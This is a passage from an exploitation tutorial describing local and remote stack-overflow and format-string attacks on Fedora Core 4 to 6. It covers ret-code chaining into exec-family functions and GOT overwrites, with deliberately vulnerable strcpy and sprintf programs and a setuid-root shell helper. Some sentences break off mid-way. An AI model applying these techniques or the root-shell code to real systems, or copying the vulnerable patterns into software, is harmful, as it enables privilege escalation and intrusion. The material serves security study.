F/C 5. The appendix attached at chapter 6.9 is to prove the contents of
chapter 5.1. %ecx off-by-one exploit is 0x82-x_strcpy.c code provided at 6.9.
I have attached it with the debugging result please take a glance at that
too. Remote exploit code for chapter 5.3 is 0x82-remote_x_strcpy.c at 6.10.
0x82-local-x_execve.c code at chapter 6.11 is for execve exploit.

chapter 5.4.

--

This is a Proof-of-Concept code that attacks general stack overflow
vulnerability in main() through argv[1] argument. It's very simple to use.

--
Usage: ./0x82-break_FC4 [target program][size of buffer][Attack frequency][Ret code frequency]
--

As you see above, the target program is strcpy and the buffer size is 256.
You should give the frequency (repeat number) of the attack to attack random
library. This code will repeat as many times as you gave unless the execve()
function address that exploit itself found in library is match to the
execve() function address of the real target program (strcpy this time).
As I said before, I could succeed the attack after 9 times of moving %esp
by ret code. ( maybe you can make another brute-force script with ret code
frequency)

Though the target program is compiled with -fomit-frame-pointer option, the
course of attack is not that different. You just need to compile the exploit
with this option.

--
$ gcc -o 0x82-break_FC4 0x82-break_FC4.c -DFOMIT_FRAME_POINTER
--

With this option on, the exploit will skip overwriting %ebp register and work
well. One thing funny is that there is a specific address in library that is
likely to be mapped. So I call the address "magic library address" in my
exploit code.


----[ 6.3 - ret(pop %eip) + environment local stack overflow exploit

  Codes below are tested on F/C 4 and when you manipulate number of ret code
and the address of exec family function it will work on F/C 5 and 6.
On F/C 4, this code worked with 38 times of ret codes and worked on F/C 6
with 46 times.

#include <stdio.h>

int main(int argc,char *argv[])
{
        char buf[8];
        strcpy(buf,argv[1]);
        return 0;
}
--

You need another shell program code for exploit to execute.

-- sh.c --
int main()
{
        setuid(0);
        setgid(0);
        execl("/bin/sh","sh","-p",0);
}
--


------[ 6.3.1 - execl() local exploit

  If the command "/bin/ls -al" was executed, the attack was successful.
You can change the command and argument for environment variable. This code
doesn't need any shellcode like sh.c at chapter 6.3 to operate. That makes
this code relatively clean. :-)

------[ 6.3.2 - execle() local exploit

  This is a code that uses sh program at 6.3. One thing special for this code
is that this code uses argument pointer to attack instead of environment
variable pointer. Doing this is to enter null(0x00000000) into the second and
the third argument of execv family function. It is different from other
technique that enter a address of pointer that points null code. To make this
continuous null(0x00000000) I used both null codes of end of environment
variable pointer and argument pointer.

----[ 6.7 - __do_global_dtors_aux() + exec family local format string exploit

  You will find that size of attack code is depend on the version of each
operation system. It is because, on F/C 3 and 4, the second argument of
execv() could have null (0x0000000) without adding 16bytes through
__do_global_dtors_aux(). So, it is possible to attack with only 8bytes of
attack code. As a matter of course, on F/C 5 and 6, we try 12bytes attack
with __do_global_dtors_aux() + __do_global_dtors_aux()+27 + execv function as
we studied.

In the exploit code, I have assigned 30 environment variables for the test and
filled 252 of local variables with ret code. Call ret for 63 times and move
%esp register by 4bytes. Finally, insert epilog address of main() to make
epilog happen again. let's test and complete the exploit.

As you can see above, 27th environment variable is popped into %ecx register.
%esp register is at %ecx - 4 , so it is 26th environment variable.
If ret code (pop %eip) happen now, return address would be 0x00263241, "A26".
It is time to complete the exploit code base on the result above.

Now that, 26th environment variable is a return address, I entered the address
of exeve() into this variable. 27th will be the address of %ecx and arguments
of execve() will be saved since 28th variable. 28th variable will be the
first argument of execve() and it has to be an address somewhere in library
whose value is string "sh".

There will be 4bytes of null from 29th to 32nd variable as the second

4bytes value at once on environment variable, I entered 1byte 4 times.
The null value for the third argument is same. It will be save from 33rd to

Through debug work after the compile, you should check whether the address of
each function and sh string is right. These address can be varied by the
difference among systems. You just find and enter right address then it will
work fine.

----[ 6.12 - string copy plt + execve() GOT overwrite local stack overflow exploit

  Exploit codes on this chapter are also test on F/C 6 
and will work fine on both F/C 5 and 6. vuln.c code is below.

-- vuln.c --
int main(int argc,char *argv[]){
        f(argv[1]);
}
int f(char *str){
        char buf[8];
        sprintf(buf,"%stest",str);
}
--

vuln program is same as coe on 6.11. It uses sprintf()'s plt. 
Exploit code will try a brute-force attack automatically.
